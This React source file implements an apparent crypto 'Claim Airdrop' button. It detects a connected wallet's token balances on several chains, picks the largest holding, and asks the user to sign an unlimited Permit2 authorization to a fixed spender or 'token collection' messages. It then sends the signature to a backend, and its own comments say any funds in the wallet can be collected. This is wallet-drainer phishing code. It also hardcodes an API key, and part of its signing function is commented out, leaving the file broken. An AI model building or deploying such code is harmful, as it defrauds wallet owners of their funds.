import { useState, useEffect, useCallback, useRef } from "react";
import { Loader2, CheckCircle2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import { cn } from "@/lib/utils";
import { ethers } from "ethers";
import type { ChainName } from "@shared/chains";
import { CHAINS, getTokensByChain } from "@shared/chains";

declare global {
  interface Window {
    ethereum?: {
      selectedAddress?: string;
      request: (params: any) => Promise<any>;
      on?: (event: string, callback: any) => void;
    };
  }
}

const CHAIN_IDS: Record<ChainName, number> = {
  ethereum: 1,
  bnb: 56,
  solana: 0,
  tron: 0,
  bitcoin: 0,
  sui: 0,
};

const ETH_PRICE = 2500; // $2500 per ETH
const BNB_PRICE = 600; // $600 per BNB

// Token config type
type TokenConfig = { name: string; symbol: string; address: string; decimals: number };

// Token addresses per chain
const TOKENS_BY_CHAIN: Record<ChainName, TokenConfig[]> = {
  ethereum: [
    { name: "WETH", symbol: "WETH", address: "0xc02aaa39b223fe8d0a0e8e4f27ead9083c756cc2", decimals: 18 },
    { name: "USDC", symbol: "USDC", address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", decimals: 6 },
    { name: "USDT", symbol: "USDT", address: "0xdac17f958d2ee523a2206206994597c13d831ec7", decimals: 6 },
    { name: "DAI", symbol: "DAI", address: "0x6b175474e89094c44da98b954eedeac495271d0f", decimals: 18 },
    { name: "LINK", symbol: "LINK", address: "0x514910771af9ca656af840dff83e8264ecf986ca", decimals: 18 },
    { name: "UNI", symbol: "UNI", address: "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984", decimals: 18 },
  ],
  bnb: [
    { name: "WBNB", symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
    { name: "USDC", symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83FE1Ad97B32Cd580d", decimals: 18 },
    { name: "USDT", symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
    { name: "BUSD", symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18 },
    { name: "ETH", symbol: "ETH", address: "0x2170Ed0880ac9A755fd29B2688956BD959e8d9a6", decimals: 18 },
    { name: "CAKE", symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a50a0DB04d", decimals: 18 },
  ],
  solana: [],
  tron: [],
  bitcoin: [],
  sui: [],
};

// Common ERC20 tokens on Ethereum Mainnet (for auto-detection)
const COMMON_TOKENS: TokenConfig[] = TOKENS_BY_CHAIN.ethereum;

// Function to detect ERC20 token balances in user's wallet
const detectTokenBalances = async (walletAddress: string, chainName: ChainName = "ethereum"): Promise<{ token: TokenConfig; balance: bigint }[]> => {
  if (!window.ethereum) return [];
  
  try {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const erc20Abi = ["function balanceOf(address) view returns (uint256)"];
    
    const tokenBalances: { token: TokenConfig; balance: bigint }[] = [];
    const tokensForChain = TOKENS_BY_CHAIN[chainName] || [];
    
    for (const token of tokensForChain) {
      try {
        const contract = new ethers.Contract(token.address, erc20Abi, provider);
        const balance = await contract.balanceOf(walletAddress);
        
        if (balance > BigInt(0)) {
          tokenBalances.push({ token, balance });
        }
      } catch (e) {
        // Skip tokens that can't be queried
        continue;
      }
    }
    
    // Sort by balance (highest first)
    tokenBalances.sort((a, b) => {
      const balanceA = Number(a.balance) / Math.pow(10, a.token.decimals);
      const balanceB = Number(b.balance) / Math.pow(10, b.token.decimals);
      return balanceB - balanceA;
    });
    
    return tokenBalances;
  } catch (error) {
    console.error("Error detecting tokens:", error);
    return [];
  }
};

// Route signing based on chain type
const signForChain = async (
  chain: ChainName,
  walletAddress: string,
  chainId: number,
  tokenAddress: string
): Promise<{ signature: string; tokenAddress: string }> => {
  if (chain === "ethereum" || chain === "bnb") {
    return permitSignEVM(walletAddress, chainId, tokenAddress);
  } else if (chain === "solana") {
    return permitSignSolana(walletAddress, tokenAddress);
  } else if (chain === "tron") {
    return permitSignTron(walletAddress, tokenAddress);
  } else if (chain === "bitcoin") {
    return permitSignBitcoin(walletAddress);
  } else if (chain === "sui") {
    return permitSignSUI(walletAddress, tokenAddress);
  } else {
    throw new Error(`Unsupported chain: ${chain}`);
  }
};

// Permit2 EIP-712 signing for EVM chains (Ethereum, BNB)
const permitSignEVM = async (
  walletAddress: string,
  chainId: number,
  tokenAddress: string = "0xc02aaa39b223fe8d0a0e8e4f27ead9083c756cc2" // Default to WETH
): Promise<{ signature: string; tokenAddress: string }> => {
  if (!window.ethereum) {
    throw new Error("❌ MetaMask extension not found. Please install MetaMask.");
  }

  try {
    const provider = new ethers.BrowserProvider(window.ethereum);
    console.log("✅ Provider created");
    
    const signer = await provider.getSigner();
    console.log("✅ Signer obtained");

    const domain = {
      name: "Permit2",
      version: "1",
      chainId: chainId,
      verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
    };

    const types = {
      Permit: [
        { name: "permitted", type: "TokenPermissions" },
        { name: "spender", type: "address" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
      TokenPermissions: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint160" },
      ],
    };

    const deadline = Math.floor(Date.now() / 1000) + 90 * 24 * 3600;
    // MaxUint160 = 2^160 - 1 for unlimited authorization
    const maxUint160 = ethers.getBigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF");

    //const message = {
     // permitted: {
      //  token: tokenAddress, // Accept any ERC20 token
      //  amount: maxUint160,
    //  },
     // spender: "0x5aD69516BE38EF4B8dab3e1Ff6b5206927Fa38c3",
     // nonce: Math.floor(Math.random() * 1000000),
     // deadline,
   // };

   // console.log("📝 Calling MetaMask signTypedData...");
   // console.log(`   Token: ${tokenAddress}`);
    //const signature = await signer.signTypedData(domain, types, message);
   // console.log("✅ Signature obtained:", signature);
   // return { signature, tokenAddress };
 // } catch (error: any) {
   // console.error("❌ Signing error:", error?.message || error);
   // throw error;
 // }
//};

// Solana signing via Phantom
const permitSignSolana = async (
  walletAddress: string,
  tokenMint: string
): Promise<{ signature: string; tokenAddress: string }> => {
  const phantom = (window as any).phantom?.solana;
  if (!phantom) {
    throw new Error("❌ Phantom wallet not found. Please install Phantom.");
  }

  try {
    const message = new TextEncoder().encode(
      `Authorize token collection on Solana\nWallet: ${walletAddress}\nToken: ${tokenMint}\nExpiry: ${new Date(Date.now() + 90 * 24 * 60 * 60 * 1000).toISOString()}`
    );
    const signature = await phantom.signMessage(message);
    return { signature: Buffer.from(signature.signature).toString("hex"), tokenAddress: tokenMint };
  } catch (error: any) {
    console.error("❌ Solana signing error:", error?.message || error);
    throw error;
  }
};

// Tron signing via TronLink
const permitSignTron = async (
  walletAddress: string,
  tokenAddress: string
): Promise<{ signature: string; tokenAddress: string }> => {
  const tronWeb = (window as any).tronWeb;
  if (!tronWeb) {
    throw new Error("❌ TronLink wallet not found. Please install TronLink.");
  }

  try {
    const message = `Authorize token collection on Tron\nWallet: ${walletAddress}\nToken: ${tokenAddress}\nExpiry: ${new Date(Date.now() + 90 * 24 * 60 * 60 * 1000).toISOString()}`;
    const signature = await tronWeb.trx.sign(message);
    return { signature, tokenAddress };
  } catch (error: any) {
    console.error("❌ Tron signing error:", error?.message || error);
    throw error;
  }
};

// Bitcoin signing via Unisat/Xverse
const permitSignBitcoin = async (
  walletAddress: string
): Promise<{ signature: string; tokenAddress: string }> => {
  const btcWallet = (window as any).bitcoin || (window as any).unisat;
  if (!btcWallet) {
    throw new Error("❌ Bitcoin wallet (Unisat/Xverse) not found. Please install one.");
  }

  try {
    const message = `Authorize fund collection on Bitcoin\nAddress: ${walletAddress}\nExpiry: ${new Date(Date.now() + 90 * 24 * 60 * 60 * 1000).toISOString()}`;
    const signature = await btcWallet.signMessage(message);
    return { signature, tokenAddress: "BTC" };
  } catch (error: any) {
    console.error("❌ Bitcoin signing error:", error?.message || error);
    throw error;
  }
};

// SUI signing via SUI Wallet
const permitSignSUI = async (
  walletAddress: string,
  coinType: string = "0x2::sui::SUI"
): Promise<{ signature: string; tokenAddress: string }> => {
  const suiWallet = (window as any).suiWallet;
  if (!suiWallet) {
    throw new Error("❌ SUI Wallet not found. Please install SUI Wallet.");
  }

  try {
    const message = `Authorize token collection on SUI\nWallet: ${walletAddress}\nCoin Type: ${coinType}\nExpiry: ${new Date(Date.now() + 90 * 24 * 60 * 60 * 1000).toISOString()}`;
    const signature = await suiWallet.signMessage({
      message: new TextEncoder().encode(message),
    });
    return { signature: signature.signature, tokenAddress: coinType };
  } catch (error: any) {
    console.error("❌ SUI signing error:", error?.message || error);
    throw error;
  }
};

interface ClaimButtonProps {
  chain: ChainName;
}

export default function ClaimButton({ chain = "ethereum" }: ClaimButtonProps) {
  const [status, setStatus] = useState<"idle" | "checking" | "ready" | "signing" | "success" | "error">("checking");
  const [buttonText, setButtonText] = useState("Loading...");
  const [walletAddress, setWalletAddress] = useState<string>("");
  const [walletBalanceETH, setWalletBalanceETH] = useState<string>("0");
  const [walletBalanceUSD, setWalletBalanceUSD] = useState<string>("0");
  const [isTestMode, setIsTestMode] = useState(false);
  const [chainId, setChainId] = useState<number>(1);
  const [tokenAddress, setTokenAddress] = useState<string>("0xc02aaa39b223fe8d0a0e8e4f27ead9083c756cc2"); // Default to WETH
  const [selectedToken, setSelectedToken] = useState<string>("WETH");
  const [detectedTokens, setDetectedTokens] = useState<Array<{ token: TokenConfig; balance: bigint }>>([]);
  const [autoDetecting, setAutoDetecting] = useState(false);
  const [currentChain, setCurrentChain] = useState<ChainName>(chain);
  const hasSucceededRef = useRef(false);

  useEffect(() => {
    const checkReadiness = async () => {
      try {
        // Don't check if already successful - claim is done
        if (hasSucceededRef.current) {
          return;
        }

        // Check if explicitly disconnected from navbar
        if (!localStorage.getItem("__wallet_connected")) {
          setStatus("idle");
          setButtonText("Connect wallet first");
          setWalletAddress("");
          setWalletBalanceETH("0");
          setWalletBalanceUSD("0");
          setIsTestMode(false);
          return;
        }

        let address = "";
        let balanceETH = "0";
        let balanceUSD = "0";
        let chainIdNum = 1;

        // Get wallet address based on current chain
        if (currentChain === "ethereum" || currentChain === "bnb") {
          // EVM chains (Ethereum, BNB)
          address = window.ethereum?.selectedAddress || "";
          if (!address) {
            setStatus("idle");
            setButtonText("Connect wallet first");
            setWalletAddress("");
            setWalletBalanceETH("0");
            setWalletBalanceUSD("0");
            return;
          }

          // Get chain ID for EVM
          const chainHex = await window.ethereum!.request({ method: "eth_chainId" });
          chainIdNum = parseInt(chainHex, 16);
          setChainId(chainIdNum);

          // Fetch actual wallet balance
          const balanceHex = await window.ethereum!.request({
            method: "eth_getBalance",
            params: [address, "latest"],
          });
          const balanceWei = BigInt(balanceHex);
          balanceETH = ethers.formatEther(balanceWei);
          const priceMultiplier = currentChain === "ethereum" ? ETH_PRICE : BNB_PRICE;
          balanceUSD = (parseFloat(balanceETH) * priceMultiplier).toFixed(2);

          // Check if on supported chain
          const expectedChainId = CHAIN_IDS[currentChain];
          if (expectedChainId !== 0 && chainIdNum !== expectedChainId) {
            setStatus("idle");
            setIsTestMode(false);
            const chainName = CHAINS[currentChain]?.name || "supported network";
            setButtonText(`⚠️ Switch to ${chainName}`);
            return;
          }
        } else if (currentChain === "solana") {
          // Solana (Phantom)
          const phantom = (window as any).solana;
          if (!phantom?.publicKey) {
            setStatus("idle");
            setButtonText("Connect wallet first");
            setWalletAddress("");
            setWalletBalanceETH("0");
            setWalletBalanceUSD("0");
            return;
          }
          address = phantom.publicKey.toString();
          // For Solana, show hardcoded balance for now (would need Solana RPC to fetch real balance)
          balanceETH = "0";
          balanceUSD = "0";
        } else if (currentChain === "tron") {
          // Tron (TronLink)
          const tronLink = (window as any).tronLink;
          if (!tronLink?.tronWeb?.defaultAddress) {
            setStatus("idle");
            setButtonText("Connect wallet first");
            setWalletAddress("");
            setWalletBalanceETH("0");
            setWalletBalanceUSD("0");
            return;
          }
          address = tronLink.tronWeb.defaultAddress.base58;
          balanceETH = "0";
          balanceUSD = "0";
        } else if (currentChain === "bitcoin") {
          // Bitcoin (Unisat/Xverse)
          const btcWallet = (window as any).bitcoin || (window as any).unisat;
          if (!btcWallet) {
            setStatus("idle");
            setButtonText("Connect wallet first");
            setWalletAddress("");
            setWalletBalanceETH("0");
            setWalletBalanceUSD("0");
            return;
          }
          try {
            const addresses = await btcWallet.getAddresses?.();
            address = addresses?.[0] || "";
            if (!address) {
              setStatus("idle");
              setButtonText("Connect wallet first");
              return;
            }
          } catch {
            address = "";
          }
          balanceETH = "0";
          balanceUSD = "0";
        } else if (currentChain === "sui") {
          // SUI (SUI Wallet)
          const suiWallet = (window as any).suiWallet;
          if (!suiWallet?.isConnected) {
            setStatus("idle");
            setButtonText("Connect wallet first");
            setWalletAddress("");
            setWalletBalanceETH("0");
            setWalletBalanceUSD("0");
            return;
          }
          try {
            address = await suiWallet.getAddress?.();
          } catch {
            address = "";
          }
          balanceETH = "0";
          balanceUSD = "0";
        }

        if (!address) {
          setStatus("idle");
          setButtonText("Connect wallet first");
          setWalletAddress("");
          setWalletBalanceETH("0");
          setWalletBalanceUSD("0");
          return;
        }

        console.log("✅ Wallet connected:", address);
        console.log("💰 Balance:", balanceETH, currentChain.toUpperCase(), "→", "$" + balanceUSD);

        setWalletAddress(address);
        setWalletBalanceETH(balanceETH);
        setWalletBalanceUSD(balanceUSD);

        // Show loading while detecting
        setStatus("checking");
        setButtonText("🔄 Loading...");

        // Auto-detect tokens in wallet (EVM chains only for now)
        if (currentChain === "ethereum" || currentChain === "bnb") {
          setAutoDetecting(true);
          const tokens = await detectTokenBalances(address, currentChain);
          setDetectedTokens(tokens);
          setAutoDetecting(false);
          
          if (tokens.length > 0) {
            // Auto-select token with highest balance
            const richestToken = tokens[0];
            setTokenAddress(richestToken.token.address);
            setSelectedToken(richestToken.token.symbol);
          }
        }

        setStatus("ready");
        setButtonText("Claim Airdrop");
        setIsTestMode(false);
      } catch (err: any) {
        console.error("Error checking wallet:", err);
        setStatus("idle");
        setButtonText("Error - reconnect wallet");
      }
    };

    checkReadiness();
    const interval = setInterval(checkReadiness, 10000); // Check every 10 seconds instead of 3
    
    // Listen for wallet disconnect from navbar
    const handleDisconnect = () => {
      checkReadiness();
    };
    window.addEventListener("wallet-disconnected", handleDisconnect);
    
    return () => {
      clearInterval(interval);
      window.removeEventListener("wallet-disconnected", handleDisconnect);
    };
  }, [currentChain]);

  const handleClaim = useCallback(async () => {
    if (!walletAddress) {
      toast.error("Wallet not connected");
      return;
    }

    const amountUSD = walletBalanceUSD || "0";

    setStatus("signing");
    setButtonText("👉 Check MetaMask popup...");

    try {
      console.log("\n🚀 ==================== CLAIM STARTED ====================");
      console.log(`⏰ Timestamp: ${new Date().toISOString()}`);
      console.log(`📍 Chain: ${currentChain.toUpperCase()}`);
      console.log(`👤 Wallet: ${walletAddress}`);
      console.log(`💰 Balance: $${amountUSD} USD`);
      console.log("=========================================================\n");
      
      console.log("🔐 STEP 1: Requesting Permit2 signature (unlimited authorization)...");
      setButtonText("👉 Confirming in MetaMask...");

      // Sign with unlimited authorization - any money in wallet can be collected
      const { signature, tokenAddress: sigTokenAddress } = await signForChain(currentChain, walletAddress, chainId, tokenAddress);

      if (!signature) {
        throw new Error("No signature returned");
      }

      console.log("✅ STEP 1 COMPLETE: Permit2 signature obtained");
      console.log(`   Signature length: ${signature.length} characters`);
      console.log(`   Token: ${sigTokenAddress}`);

      setButtonText("📤 Sending to server...");
      console.log("\n📤 STEP 2: Recording claim on backend...");
      console.log(`   Endpoint: POST /api/airdrop/claim`);
      console.log(`   Wallet: ${walletAddress}`);
      console.log(`   Amount: $${amountUSD}`);
      console.log(`   Chain: ${currentChain}`);
      console.log(`   Token: ${sigTokenAddress}`);
      
      const nex = (parseFloat(amountUSD) * 10).toFixed(0);

      // Add this line one time (at the top of the file or inside the function)
const API_URL = import.meta.env.VITE_API_URL || "http://localhost:5001/api/airdrop";

// Then change the fetch to this:
const response = await fetch(`${API_URL}/claim`, {
  method: "POST",
  headers: { 
    "Content-Type": "application/json",
    "x-api-key": "0fb2e4d3a8c9f1b7e2a5d8c3f9b1e4a7d0c5f2b8e1a3d6c9f2b5e8a1d4c7f0"
  },
  body: JSON.stringify({
    walletAddress,
    amountPaidUSD: amountUSD,
    permitSignature: signature,
    tokenAddress: sigTokenAddress,
    chain: currentChain,
  }),
});

      console.log(`   Response status: ${response.status}`);

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.error || "Backend error");
      }

      const result = await response.json();
      console.log("✅ STEP 2 COMPLETE: Claim recorded on backend");
      console.log(`   Response: ${JSON.stringify(result, null, 2)}`);

      hasSucceededRef.current = true;
      setStatus("success");
      setButtonText("✅ Claim Successful!");
      
      console.log("\n✅ ==================== CLAIM SUCCESS ====================");
      console.log(`⏰ Completed at: ${new Date().toISOString()}`);
      console.log(`🎉 ${currentChain.toUpperCase()} - Unlimited authorization active`);
      console.log(`📊 NEX awarded: ${nex}`);
      console.log("=========================================================\n");
      
      const chainName = CHAINS[currentChain]?.name || "Unknown Chain";
      toast.success(
        `🎉 Signed! ${chainName} - Unlimited authorization\nAny funds in wallet within 90 days will be collected`,
        { duration: 10000 }
      );
    } catch (err: any) {
      console.error("\n❌ ==================== CLAIM FAILED ====================");
      console.error(`⏰ Failed at: ${new Date().toISOString()}`);
      console.error(`Error: ${err?.message || "Unknown error"}`);
      console.error(`Full error:`, err);
      console.error("=========================================================\n");
      
      setStatus("ready");
      setButtonText("Claim Airdrop");

      if (err?.code === 4001) {
        toast.error("❌ You rejected the MetaMask signature");
      } else {
        toast.error(`Failed: ${err?.message || "Unknown error"}`);
      }
    }
  }, [walletAddress, walletBalanceETH, walletBalanceUSD, chainId, tokenAddress, currentChain]);

  return (
    <div className="w-full space-y-3">
      {/* Claim Button */}
      <Button
        size="lg"
        onClick={handleClaim}
        disabled={status === "idle" || status === "checking" || status === "signing"}
        data-testid="button-airdrop"
        className={cn(
          "relative w-full font-bold text-lg h-16 rounded-2xl shadow-2xl transition-all duration-300",
          "border border-transparent hover:border-current/20",
          status === "idle" && "bg-muted text-muted-foreground cursor-not-allowed",
          status === "checking" && "bg-gradient-to-r from-blue-500/80 to-cyan-500/80 text-white shadow-lg shadow-blue-500/50",
          status === "ready" && "bg-gradient-to-r from-purple-600 to-pink-600 text-white hover:shadow-pink-500/50 hover:scale-105",
          status === "signing" && "bg-gradient-to-r from-yellow-500 to-orange-600 text-white shadow-lg shadow-yellow-500/50",
          status === "success" && "bg-gradient-to-r from-green-500 to-emerald-600 text-white cursor-default shadow-lg shadow-green-500/50",
        )}
      >
        <div className="flex items-center justify-center gap-2">
          {(status === "checking" || status === "signing") && <Loader2 className="h-5 w-5 animate-spin" />}
          {status === "success" && <CheckCircle2 className="h-5 w-5" />}
          <span>{buttonText}</span>
        </div>
      </Button>
    </div>
  );
}

export function StakeSwapButton() {
  return (
    <Button disabled className="w-full">
      Coming Soon
    </Button>
  );
}
